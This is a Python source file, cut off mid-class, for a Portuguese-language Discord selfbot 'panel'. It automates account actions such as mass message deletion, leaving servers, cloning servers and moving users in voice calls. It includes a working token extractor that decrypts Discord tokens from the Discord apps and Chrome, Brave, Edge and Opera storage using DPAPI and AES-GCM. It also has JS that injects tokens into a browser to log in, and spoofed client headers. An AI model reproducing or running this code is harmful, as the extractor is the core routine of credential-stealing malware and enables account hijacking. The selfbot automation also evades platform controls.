import asyncio
import aiohttp
import base64
import json
import random
import os
import sys
import zlib
import re
import hashlib
import ctypes
import ctypes.wintypes
import shutil
import builtins
import tempfile
import urllib.request
import urllib.error
import urllib.parse
import time
from datetime import datetime

# ANSI Colors
if os.name == "nt":
    os.system("")  # habilita ANSI no Windows

    # Forca UTF-8 no terminal do Windows para evitar caracteres quebrados.
    try:
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
        ctypes.windll.kernel32.SetConsoleCP(65001)
    except Exception:
        pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass


_ORIGINAL_PRINT = builtins.print


def _mojibake_score(s: str) -> int:
    return s.count("A") + s.count("a") + s.count("A")


def _fix_mojibake_text(s: str) -> str:
    if not s or _mojibake_score(s) == 0:
        return s

    best = s
    best_score = _mojibake_score(s)

    for enc in ("cp1252", "latin1"):
        current = s
        for _ in range(2):
            try:
                candidate = current.encode(enc, errors="ignore").decode("utf-8", errors="ignore")
            except Exception:
                break
            cand_score = _mojibake_score(candidate)
            if candidate and cand_score < best_score:
                best = candidate
                best_score = cand_score
                current = candidate
            else:
                break

    return best


def print(*args, **kwargs):
    fixed_args = tuple(_fix_mojibake_text(a) if isinstance(a, str) else a for a in args)
    _ORIGINAL_PRINT(*fixed_args, **kwargs)

class c:
    R   = "\033[91m"   # vermelho claro
    DR  = "\033[31m"   # vermelho escuro
    W   = "\033[97m"   # branco
    G   = "\033[90m"   # cinza
    C   = "\033[96m"   # ciano
    Y   = "\033[93m"   # amarelo
    GR  = "\033[92m"   # verde
    B   = "\033[1m"    # bold
    D   = "\033[2m"    # dim
    X   = "\033[0m"    # reset

# Cores do banner
ROXO = '\033[0;38;2;180;0;0m'      # vermelho sangue claro
AZUL = '\033[0;38;2;100;0;0m'     # vermelho sangue escuro
BRANCO = '\033[0;37m'
NC   = '\033[0m'    # reset

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def show_banner():
    print("\n" * 2)
    print(f"{ROXO}   ███████╗██╗   ██╗██╗ ██████╗██╗██████╗ ███████╗{NC}")
    print(f"{ROXO}   ██╔════╝██║   ██║██║██╔════╝██║██╔══██╗██╔════╝{NC}")
    print(f"{ROXO}   ███████╗██║   ██║██║██║     ██║██║  ██║█████╗  {NC}")
    print(f"{AZUL}   ╚════██║██║   ██║██║██║     ██║██║  ██║██╔══╝  {NC}")
    print(f"{AZUL}   ███████║╚██████╔╝██║╚██████╗██║██████╔╝███████╗{NC}")
    print(f"{AZUL}   ╚══════╝ ╚═════╝ ╚═╝ ╚═════╝╚═╝╚═════╝ ╚══════╝{NC}")
    print()

def show_menu(username="", user_id="", num_accounts=1, all_bots=None):
    clear_screen()
    show_banner()
    print(f"  {BRANCO}{'-' * 58}{NC}")
    if username:
        print(f"  \033[92m●\033[0m Logado: {BRANCO}{username}{NC} {AZUL}(ID: {user_id}){NC}")
    else:
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Conectando...")
    print(f"  {BRANCO}{'-' * 58}{NC}")
    print()
    print(f"  {BRANCO}  #   COMANDO              DESCRICAO{NC}")
    print(f"  {AZUL}  {'-' * 52}{NC}")
    print(f"  {BRANCO}[{ROXO}1{BRANCO}]{NC}  {BRANCO}cl{NC}                   Apagar msgs no canal/DM")
    print(f"  {BRANCO}[{ROXO}2{BRANCO}]{NC}  {BRANCO}cldms{NC}                Apagar msgs so nas DMs abertas")
    print(f"  {BRANCO}[{ROXO}3{BRANCO}]{NC}  {BRANCO}clall{NC}                Apagar msgs em todas as DMs")
    print(f"  {BRANCO}[{ROXO}4{BRANCO}]{NC}  {BRANCO}clfull{NC}               Apagar via Data Package")
    print(f"  {BRANCO}[{ROXO}5{BRANCO}]{NC}  {BRANCO}close dms{NC}            Fechar todas DMs e grupos")
    print(f"  {BRANCO}[{ROXO}6{BRANCO}]{NC}  {BRANCO}farmcall{NC}             Entrar/sair do canal de voz")
    print(f"  {BRANCO}[{ROXO}7{BRANCO}]{NC}  {BRANCO}quitservers{NC}          Sair de todos os servidores")
    print(f"  {BRANCO}[{ROXO}8{BRANCO}]{NC}  {BRANCO}removefriends{NC}        Remover todos os amigos")
    print(f"  {BRANCO}[{ROXO}9{BRANCO}]{NC}  {BRANCO}server clone{NC}         Clonar estrutura de servidor")
    print(f"  {BRANCO}[{ROXO}10{BRANCO}]{NC} {BRANCO}utilidades call{NC}      Mover/desconectar/coleira")
    print(f"  {AZUL}  {'-' * 52}{NC}")
    print(f"  {BRANCO}[{ROXO}0{BRANCO}]{NC}  {BRANCO}central da conta{NC}     Adicionar/trocar/remover")
    print(f"  {AZUL}  {'-' * 52}{NC}")
    print()

def parse_comma_ids(raw: str) -> set[str]:
    """Extrai IDs separados por virgula, espaco ou mencao."""
    return {sid for sid in re.findall(r"\d+", raw or "") if sid != "0"}

def format_ids(ids: set[str]) -> str:
    return ", ".join(sorted(ids))

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.join(os.path.dirname(sys.executable), "cl")
    os.makedirs(BASE_DIR, exist_ok=True)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

CONFIG_PATH = os.path.join(BASE_DIR, "config.json")
SETTINGS_PATH = os.path.join(BASE_DIR, "settings.json")
APP_VERSION = "1.0.0"
UPDATE_ENABLED = True
UPDATE_MANIFEST_URL = "https://raw.githubusercontent.com/suicidearc/suicidearc/main/version.json"
UPDATE_TIMEOUT = 15

# Settings (delays)
DEFAULT_SETTINGS = {
    "delays": {
        "delete_message": {"min": 1.8, "max": 2.4},
        "search": {"delay": 1.2},
        "quit_server": {"min": 1.0, "max": 2.5},
        "remove_friend": {"min": 2.0, "max": 4.0},
        "close_dm": {"min": 0.3, "max": 0.8},
        "clone_normal": {"min": 0.8, "max": 1.5},
        "clone_bot": {"min": 0.6, "max": 1.2},
        "elevator_group": {"delay": 1.2},
        "elevator_user": {"delay": 0.8},
        "voice_move": {"delay": 0.6},
    }
}

def load_settings() -> dict:
    """Carrega settings.json. Cria com valores padrao se nao existir."""
    if not os.path.exists(SETTINGS_PATH):
        save_settings(DEFAULT_SETTINGS)
        return DEFAULT_SETTINGS.copy()
    try:
        with open(SETTINGS_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
        # Garante que todas as chaves existam (merge com default)
        delays = data.get("delays", {})
        changed = False
        for key, default_val in DEFAULT_SETTINGS["delays"].items():
            if key not in delays:
                delays[key] = default_val
                changed = True
            else:
                for subkey, subval in default_val.items():
                    if subkey not in delays[key] or subkey == "description":
                        continue
                    # mantAm o valor do usuario
        data["delays"] = delays
        if changed:
            save_settings(data)
        return data
    except Exception:
        return DEFAULT_SETTINGS.copy()

def save_settings(settings: dict):
    """Salva settings.json formatado."""
    with open(SETTINGS_PATH, "w", encoding="utf-8") as f:
        json.dump(settings, f, ensure_ascii=False, indent=2)

def get_delay(key: str) -> tuple:
    """Retorna (min, max) de um delay do settings.json."""
    settings = load_settings()
    d = settings.get("delays", {}).get(key, {})
    return (d.get("min", 1.0), d.get("max", 2.0))

def get_delay_single(key: str, subkey: str = "delay") -> float:
    """Retorna um valor de delay unico (nao range)."""
    settings = load_settings()
    d = settings.get("delays", {}).get(key, {})
    return d.get(subkey, 1.0)

def _parse_version(version: str) -> tuple:
    parts = []
    for part in re.findall(r"\d+", str(version or "")):
        try:
            parts.append(int(part))
        except Exception:
            parts.append(0)
    return tuple(parts or [0])

def _version_lt(current: str, latest: str) -> bool:
    a = list(_parse_version(current))
    b = list(_parse_version(latest))
    size = max(len(a), len(b))
    a.extend([0] * (size - len(a)))
    b.extend([0] * (size - len(b)))
    return tuple(a) < tuple(b)

def _sha256_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()

def _download_file(url: str, dest_path: str, timeout: int):
    req = urllib.request.Request(url, headers={"User-Agent": f"SuicidePanel/{APP_VERSION}"})
    with urllib.request.urlopen(req, timeout=timeout) as resp, open(dest_path, "wb") as f:
        shutil.copyfileobj(resp, f)

def _fetch_update_manifest(manifest_url: str, timeout: int) -> dict:
    if not manifest_url.lower().startswith("https://"):
        raise RuntimeError("manifest_url precisa usar HTTPS.")
    sep = "&" if urllib.parse.urlparse(manifest_url).query else "?"
    fresh_url = f"{manifest_url}{sep}t={int(time.time())}"
    req = urllib.request.Request(fresh_url, headers={
        "User-Agent": f"SuicidePanel/{APP_VERSION}",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    })
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read(1024 * 1024)
    data = json.loads(raw.decode("utf-8"))
    if not isinstance(data, dict):
        raise RuntimeError("Manifest de update invalido.")
    return data

def _write_update_bat(new_exe: str, current_exe: str) -> str:
    bat_path = os.path.join(tempfile.gettempdir(), "suicide_update_apply.bat")
    bat = f"""@echo off
chcp 65001 >nul
timeout /t 2 /nobreak >nul
:retry
copy /Y "{new_exe}" "{current_exe}" >nul
if errorlevel 1 (
  timeout /t 1 /nobreak >nul
  goto retry
)
start "" "{current_exe}"
del "{new_exe}" >nul 2>nul
del "%~f0" >nul 2>nul
"""
    with open(bat_path, "w", encoding="utf-8") as f:
        f.write(bat)
    return bat_path

def _apply_mandatory_update(manifest: dict, timeout: int):
    latest = str(manifest.get("latest_version") or "").strip()
    download_url = str(manifest.get("download_url") or "").strip()
    expected_sha = str(manifest.get("sha256") or "").strip().lower()

    if not latest or not download_url or not expected_sha:
        raise RuntimeError("Manifest precisa ter latest_version, download_url e sha256.")
    if not download_url.lower().startswith("https://"):
        raise RuntimeError("download_url precisa usar HTTPS.")
    if not getattr(sys, "frozen", False):
        raise RuntimeError("Atualizacao automatica so funciona no .exe gerado pelo PyInstaller.")

    current_exe = sys.executable
    safe_version = re.sub(r"[^0-9A-Za-z_.-]+", "_", latest)
    new_exe = os.path.join(tempfile.gettempdir(), f"suicide_update_{safe_version}.exe")

    print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Baixando atualizacao {latest}...")
    _download_file(download_url, new_exe, timeout)

    print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Verificando arquivo...")
    actual_sha = _sha256_file(new_exe).lower()
    if actual_sha != expected_sha:
        try:
            os.remove(new_exe)
        except Exception:
            pass
        raise RuntimeError("SHA-256 da atualizacao nao confere. Update bloqueado.")

    bat_path = _write_update_bat(new_exe, current_exe)
    print(f"  \033[92m*\033[0m Atualizacao baixada e validada.")
    input(f"\n  {BRANCO}Pressione ENTER para reiniciar e aplicar a atualizacao...{NC}")
    import subprocess
    subprocess.Popen([bat_path], shell=True, close_fds=True)
    sys.exit(0)

def enforce_mandatory_update():
    if not UPDATE_ENABLED:
        return

    manifest_url = str(UPDATE_MANIFEST_URL or "").strip()
    timeout = int(UPDATE_TIMEOUT or 15)
    if not manifest_url:
        print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Updates estao ligados, mas UPDATE_MANIFEST_URL esta vazio.")
        print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} Configure a URL no codigo antes de distribuir o painel.")
        sys.exit(1)

    while True:
        clear_screen()
        show_banner()
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Verificando atualizacao obrigatoria...")
        print(f"  {BRANCO}Versao atual:{NC} {APP_VERSION}\n")
        try:
            manifest = _fetch_update_manifest(manifest_url, timeout)
            latest = str(manifest.get("latest_version") or "").strip()
            min_supported = str(manifest.get("min_supported_version") or latest).strip()
            print(f"  {BRANCO}Versao remota:{NC} {latest}")
            print(f"  {BRANCO}Minima permitida:{NC} {min_supported}\n")
            must_update = _version_lt(APP_VERSION, latest) or _version_lt(APP_VERSION, min_supported)
            if not must_update:
                print(f"  \033[92m*\033[0m Painel atualizado.")
                return

            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Atualizacao obrigatoria encontrada.")
            print(f"  {BRANCO}Versao atual:{NC} {APP_VERSION}")
            print(f"  {BRANCO}Nova versao:{NC} {latest}\n")
            _apply_mandatory_update(manifest, timeout)
        except SystemExit:
            raise
        except Exception as e:
            print(f"\n  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nao foi possivel verificar/aplicar update: {e}")
            print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} O painel esta bloqueado ate conseguir verificar a atualizacao.")
            retry = input(f"\n  {BRANCO}Pressione ENTER para tentar novamente ou 0 para sair: {NC}").strip()
            if retry == "0":
                sys.exit(1)

def load_config() -> dict:
    """Carrega config.json. Cria um vazio se nao existir."""

# Token Extractor (Discord local)
def _dpapi_decrypt(encrypted: bytes) -> bytes:
    """Decripta dados usando DPAPI (Windows)."""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.wintypes.DWORD),
                     ("pbData", ctypes.POINTER(ctypes.c_char))]

    blob_in = DATA_BLOB(len(encrypted), ctypes.cast(ctypes.create_string_buffer(encrypted, len(encrypted)),
                                                      ctypes.POINTER(ctypes.c_char)))
    blob_out = DATA_BLOB()

    if ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    ):
        raw = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return raw
    return b""


def _aes_gcm_decrypt(key: bytes, encrypted: bytes) -> str:
    """Decripta token AES-256-GCM usado pelo Discord."""
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        nonce = encrypted[3:15]
        ciphertext = encrypted[15:]
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext, None).decode("utf-8")
    except Exception:
        return ""


# Login Discord Desktop App
def _copy_to_clipboard(text: str):
    """Copia texto para o clipboard (Windows)."""
    import subprocess
    process = subprocess.Popen(['clip'], stdin=subprocess.PIPE)
    process.communicate(text.encode('utf-8'))


def _user_id_from_token(token: str) -> str:
    """Extrai o user ID a partir do token (primeira parte em base64 do ID)."""
    try:
        first_part = token.split(".")[0]
        padding = 4 - len(first_part) % 4
        if padding != 4:
            first_part += "=" * padding
        return base64.b64decode(first_part).decode("utf-8")
    except Exception:
        return ""


def _generate_single_login_js(token: str) -> str:
    """Gera comando JS para logar uma conta via iframe localStorage."""
    return (
        f'let iframe=document.createElement("iframe");'
        f'document.head.appendChild(iframe);'
        f'iframe.contentWindow.localStorage.setItem("token",\'"{token}"\');'
        f'iframe.remove();'
        f'location.reload();'
    )


def _generate_all_login_js(entries: list) -> str:
    """Gera comando JS que loga todas as contas de uma vez via iframe localStorage."""
    tokens_data = []
    for entry in entries:
        token = entry["token"]
        uid = _user_id_from_token(token)
        if uid:
            tokens_data.append((uid, token))

    if not tokens_data:
        return ""

    active_id = tokens_data[0][0]
    active_token = tokens_data[0][1]

    users_arr = []
    for uid, tok in tokens_data:
        users_arr.append({"id": uid, "token": tok})

    multi_store = json.dumps({
        "_state": {
            "users": users_arr,
            "activeUserId": active_id
        },
        "_version": 2
    }, separators=(',', ':'))

    multi_store_escaped = multi_store.replace("'", "\\'")

    token_sets = ""
    for uid, tok in tokens_data:
        token_sets += f'ls.setItem("tokens",JSON.stringify(Object.assign(JSON.parse(ls.getItem("tokens")||"{{}}"),{{"{uid}":"{tok}"}})));'

    return (
        f"let iframe=document.createElement('iframe');"
        f"document.head.appendChild(iframe);"
        f"let ls=iframe.contentWindow.localStorage;"
        f"ls.setItem('token','\"{ active_token }\"');"
        f"ls.setItem('MultiAccountStore','{multi_store_escaped}');"
        f"{token_sets}"
        f"iframe.remove();"
        f"location.reload();"
    )


def extract_tokens_from_discord() -> list[dict]:
    """Extrai tokens de todas as instalacoes do Discord (Stable, Canary, PTB).
    Retorna lista de dicts: {"token": "...", "source": "Discord Canary", ...}"""
    if os.name != "nt":
        return []

    appdata = os.getenv("APPDATA", "")
    local_appdata = os.getenv("LOCALAPPDATA", "")

    # Paths das instalacoes do Discord
    discord_paths = {
        "Discord": os.path.join(appdata, "discord"),
        "Discord Canary": os.path.join(appdata, "discordcanary"),
        "Discord PTB": os.path.join(appdata, "discordptb"),
    }

    # Browsers que tambAm podem ter tokens
    browser_paths = {
        "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data", "Default"),
        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Default"),
        "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
    }

    found_tokens = []
    seen_tokens = set()

    # Regex para tokens nao encriptados
    token_patterns = [
        re.compile(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,}'),   # token normal
        re.compile(r'mfa\.[\w-]{84}'),                         # token MFA
    ]

    # Regex para tokens encriptados (prefixo dQw4w9WgXcQ:)
    encrypted_pattern = re.compile(r'dQw4w9WgXcQ:([^\s"\']+)')

    def _get_master_key(path: str) -> bytes | None:
        """Le a master key do Local State para descriptografia."""
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove o prefixo "DPAPI" (5 bytes)
            encrypted_key = encrypted_key[5:]
            return _dpapi_decrypt(encrypted_key)
        except Exception:
            return None

    def _scan_leveldb(db_path: str, source_name: str, master_key: bytes | None):
        """Escaneia arquivos leveldb em busca de tokens."""
        if not os.path.exists(db_path):
            return

        for filename in os.listdir(db_path):
            if not filename.endswith((".ldb", ".log")):
                continue
            filepath = os.path.join(db_path, filename)
            try:
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
            except Exception:
                continue

            # Busca tokens encriptados primeiro
            if master_key:
                for match in encrypted_pattern.finditer(content):
                    try:
                        encrypted_value = base64.b64decode(match.group(1))
                        token = _aes_gcm_decrypt(master_key, encrypted_value)
                        if token and token not in seen_tokens:
                            seen_tokens.add(token)
                            found_tokens.append({"token": token, "source": source_name})
                    except Exception:
                        continue

            # Busca tokens nao encriptados
            for pattern in token_patterns:
                for match in pattern.finditer(content):
                    token = match.group(0)
                    if token not in seen_tokens:
                        seen_tokens.add(token)
                        found_tokens.append({"token": token, "source": source_name})

    # Escaneia instalacoes do Discord
    for name, path in discord_paths.items():
        if not os.path.exists(path):
            continue
        master_key = _get_master_key(path)
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        _scan_leveldb(leveldb_path, name, master_key)

    # Escaneia browsers
    for name, path in browser_paths.items():
        if not os.path.exists(path):
            continue
        parent = os.path.dirname(path) if "Default" in path else path
        master_key = _get_master_key(parent)
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        _scan_leveldb(leveldb_path, name, master_key)

    return found_tokens


async def validate_and_import_tokens(found_tokens: list[dict], bots: list) -> int:
    """Valida tokens encontrados e importa os validos para config.json.
    Deduplica por user ID para evitar importar a mesma conta varias vezes.
    Re-valida tokens ja existentes e remove os expirados.
    Retorna quantidade de tokens novos importados."""
    imported = 0
    existing_tokens = set(get_tokens_from_config())

    # Coleta user IDs ja existentes no config para evitar duplicatas por conta
    existing_user_ids = set()
    for b in bots:
        if b.user_id:
            existing_user_ids.add(b.user_id)

    seen_user_ids = set(existing_user_ids)

    # Re-validar tokens ja existentes no config
    cfg = load_config()
    entries = cfg.get("tokens", [])
    if entries:
        print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} Re-validando {len(entries)} token(s) existente(s)...")
        invalid_indices = []
        async with aiohttp.ClientSession() as session:
            for idx, entry in enumerate(entries):
                tok = entry.get("token", "")
                uname = entry.get("username", "") or "(sem nome)"
                try:
                    async with session.get(
                        f"{API_BASE}/users/@me",
                        headers=get_headers(tok, with_content_type=False)
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            uid = data.get("id", "")
                            new_uname = data.get("username", uname)
                            seen_user_ids.add(uid)
                            # Atualiza username se mudou
                            if new_uname != uname:
                                update_username_in_config(tok, new_uname)
                            print(f"  {c.GR}[ok]{c.X} {new_uname}: valido")
                        else:
                            print(f"  {c.R}[x]{c.X} {uname}: invalido (HTTP {resp.status}) -> removendo")
                            invalid_indices.append(idx)
                except Exception as e:
                    print(f"  {c.R}[x]{c.X} {uname}: erro ({e}) -> mantendo")
                await asyncio.sleep(0.3)

        # Remove tokens invalidos (do maior Indice para o menor)
        if invalid_indices:
            for idx in sorted(invalid_indices, reverse=True):
                remove_token_from_config(idx)
            existing_tokens = set(get_tokens_from_config())  # recarrega apos remocao
            print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} {len(invalid_indices)} token(s) invalido(s) removido(s)")
        print()

    # Importar novos tokens
    async with aiohttp.ClientSession() as session:
        for i, entry in enumerate(found_tokens, 1):
            token = entry["token"]
            source = entry["source"]

            if token in existing_tokens:
                print(f"  {BRANCO}[{AZUL}-{BRANCO}]{NC} [{i}/{len(found_tokens)}] {source}: ja existe no config")
                continue

            try:
                async with session.get(
                    f"{API_BASE}/users/@me",
                    headers=get_headers(token, with_content_type=False)
                ) as resp:
                    if resp.status == 200:
                        user_data = await resp.json()
                        uid = user_data.get("id", "")
                        uname = user_data.get("username", "")

                        # Verifica se ja importamos essa conta (mesmo user ID)
                        if uid in seen_user_ids:
                            print(f"  {BRANCO}[{AZUL}-{BRANCO}]{NC} [{i}/{len(found_tokens)}] {source}: {uname} (duplicada, pulando)")
                            continue

                        seen_user_ids.add(uid)
                        add_token_to_config(token)
                        update_username_in_config(token, uname)
                        existing_tokens.add(token)
                        imported += 1
                        print(f"  {c.GR}[ok]{c.X} [{i}/{len(found_tokens)}] {source}: {BRANCO}{uname}{NC} -> importado!")
                    elif resp.status == 401:
                        print(f"  {c.R}[x]{c.X} [{i}/{len(found_tokens)}] {source}: token invalido/expirado")
                    elif resp.status == 403:
                        print(f"  {c.R}[x]{c.X} [{i}/{len(found_tokens)}] {source}: conta bloqueada")
                    else:
                        print(f"  {c.R}[x]{c.X} [{i}/{len(found_tokens)}] {source}: HTTP {resp.status}")
            except Exception as e:
                print(f"  {c.R}[x]{c.X} [{i}/{len(found_tokens)}] {source}: erro -> {e}")

            await asyncio.sleep(0.5)

    return imported

#
def _normalize_token_value(token) -> str:
    """Normaliza token para comparacao/armazenamento."""
    if not isinstance(token, str):
        return ""
    token = token.strip()
    if len(token) >= 2 and ((token[0] == '"' and token[-1] == '"') or (token[0] == "'" and token[-1] == "'")):
        token = token[1:-1].strip()
    return token


def _sanitize_config(cfg: dict) -> tuple[dict, bool]:
    """Garante estrutura valida e limpa active_token invalido."""
    changed = False

    if not isinstance(cfg, dict):
        cfg = {"tokens": [], "active_token": ""}
        return cfg, True

    raw_tokens = cfg.get("tokens", [])
    if not isinstance(raw_tokens, list):
        raw_tokens = []
        changed = True

    clean_entries = []
    for entry in raw_tokens:
        if not isinstance(entry, dict):
            changed = True
            continue
        tok = _normalize_token_value(entry.get("token", ""))
        if not tok:
            changed = True
            continue
        uname = entry.get("username", "")
        if not isinstance(uname, str):
            uname = str(uname) if uname is not None else ""
            changed = True
        clean_entry = {"token": tok, "username": uname}
        if entry.get("token") != tok:
            changed = True
        clean_entries.append(clean_entry)

    cfg["tokens"] = clean_entries

    active = _normalize_token_value(cfg.get("active_token", ""))
    token_set = {e["token"] for e in clean_entries}
    if active and active not in token_set:
        active = ""
        changed = True
    if cfg.get("active_token", "") != active:
        changed = True
    cfg["active_token"] = active

    return cfg, changed


def load_config() -> dict:
    """Carrega config.json. Cria um vazio se nao existir."""
    if not os.path.exists(CONFIG_PATH):
        default = {"tokens": [], "active_token": ""}
        save_config(default)
        return default
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
    except Exception:
        raw = {"tokens": [], "active_token": ""}

    cfg, changed = _sanitize_config(raw)
    if changed:
        save_config(cfg)
    return cfg

def save_config(cfg: dict):
    """Salva config.json formatado."""
    with open(CONFIG_PATH, "w", encoding="utf-8") as f:
        json.dump(cfg, f, ensure_ascii=False, indent=2)

def get_tokens_from_config() -> list[str]:
    """Retorna lista de tokens validos do config.json."""
    cfg = load_config()
    return [entry["token"] for entry in cfg.get("tokens", []) if entry.get("token")]

def get_active_token() -> str:
    """Retorna o token da conta ativa salva no config."""
    cfg = load_config()
    return cfg.get("active_token", "")

def set_active_token(token: str):
    """Salva o token da conta ativa no config."""
    cfg = load_config()
    cfg["active_token"] = _normalize_token_value(token)
    # Nao deixa active_token apontar para token inexistente
    token_set = {e.get("token") for e in cfg.get("tokens", []) if e.get("token")}
    if cfg["active_token"] and cfg["active_token"] not in token_set:
        cfg["active_token"] = ""
    save_config(cfg)

def update_username_in_config(token: str, username: str):
    """Salva o # username ao lado do token no config.json."""
    cfg = load_config()
    for entry in cfg.get("tokens", []):
        if entry.get("token") == token:
            if entry.get("username") != username:
                entry["username"] = username
                save_config(cfg)
            return

def add_token_to_config(token: str) -> bool:
    """Adiciona um token ao config.json. Retorna True se adicionado."""
    cfg = load_config()
    # Verifica se ja existe
    for entry in cfg.get("tokens", []):
        if entry.get("token") == token:
            return False
    cfg.setdefault("tokens", []).append({"token": token, "username": ""})
    save_config(cfg)
    return True

def remove_token_from_config(index: int) -> bool:
    """Remove um token pelo Indice (0-based). Retorna True se removido."""
    cfg = load_config()
    tokens = cfg.get("tokens", [])
    if 0 <= index < len(tokens):
        tokens.pop(index)
        active = _normalize_token_value(cfg.get("active_token", ""))
        token_set = {e.get("token") for e in tokens if e.get("token")}
        if active and active not in token_set:
            cfg["active_token"] = ""
        save_config(cfg)
        return True
    return False
COMMAND_PREFIX = "ml!cl"
CLALL_PREFIX = "ml!clall"
CLFULL_PREFIX = "ml!clfull"
CLDMS_PREFIX = "ml!cldms"
FARMCALL_PREFIX = "ml!farmcall"
QUITSERVERS_PREFIX = "ml!quitservers"
REMOVEFRIENDS_PREFIX = "ml!removefriends"

# Caminho para o index.json do Discord Data Package
# Coloque o package extraido na pasta 'package' ao lado do script
DATA_PACKAGE_INDEX = os.path.join(BASE_DIR, "package", "Messages", "index.json")

# Pasta de progresso -> salva canais ja limpos para continuar de onde parou (por conta)
SCRIPT_DIR = BASE_DIR

# Headers que imitam um cliente real do Discord (navegador)
def get_headers(token: str, with_content_type: bool = True):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "Sec-Ch-Ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjagKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNC4wLjauMCBTYWZhcmkvNTM3LjM2In0=",
    }
    if with_content_type:
        headers["Content-Type"] = "application/json"
    return headers


API_BASE = "https://discord.com/api/v9"
GATEWAY_URL = "wss://gateway.discord.gg/v=9&encoding=json&compress=zlib-stream"


def get_bot_headers(bot_token: str, with_content_type: bool = True):
    """Headers para requisiAAes com token de bot."""
    headers = {
        "Authorization": f"Bot {bot_token}",
        "User-Agent": "DiscordBot (https://discord.com, 1.0)",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
    }
    if with_content_type:
        headers["Content-Type"] = "application/json"
    return headers


class SelfBot:
    def __init__(self, token: str, label: str = ""):
        self.token = token
        self.label = label  # tag para identificar a conta nos logs
        self.session: aiohttp.ClientSession | None = None
        self.ws: aiohttp.ClientWebSocketResponse | None = None
        self.heartbeat_interval: float = 41.25
        self.sequence: int | None = None
        self.user_id: str | None = None
        self.username: str = ""
        self.running = True
        self.voice_channel_id: str | None = None  # canal de voz atual
        self.voice_guild_id: str | None = None    # guild do canal de voz atual
        self.guilds: list[dict] = []               # lista de guilds do READY
        self._voice_members_cache: dict[str, list[dict]] = {}  # channel_id -> [{user_id, ...}]
        self._voice_request_event: asyncio.Event | None = None  # sinaliza resposta do op 14
        self._voice_request_channel: str | None = None  # channel_id sendo consultado via op 14
        self._leash_target: str | None = None      # user ID da coleira ativa
        self._leash_running: bool = False           # flag para loop da coleira
        self._leash_monitor_task: asyncio.Task | None = None  # monitora mudanca de call fora do bot
        self._leash_last_channel_id: str | None = None
        self._leash_guild_id: str | None = None
        self._leash_scan_count: int = 0
        self._leash_pending_channel_id: str | None = None
        self._leash_pending_hits: int = 0
        self._elevator_running: bool = False        # flag para loop do elevador
        self._connected_event: asyncio.Event = asyncio.Event()  # sinaliza que reconectou
        self._zlib_buffer = bytearray()
        self._inflator = zlib.decompressobj()

    def _tag(self) -> str:
        """Retorna o prefixo de log da conta."""
        name = self.label or self.username or self.token[:8] + "..."
        return f"[{name}]"

    @staticmethod
    def _normalize_id_set(values) -> set[str]:
        if not values:
            return set()
        if isinstance(values, str):
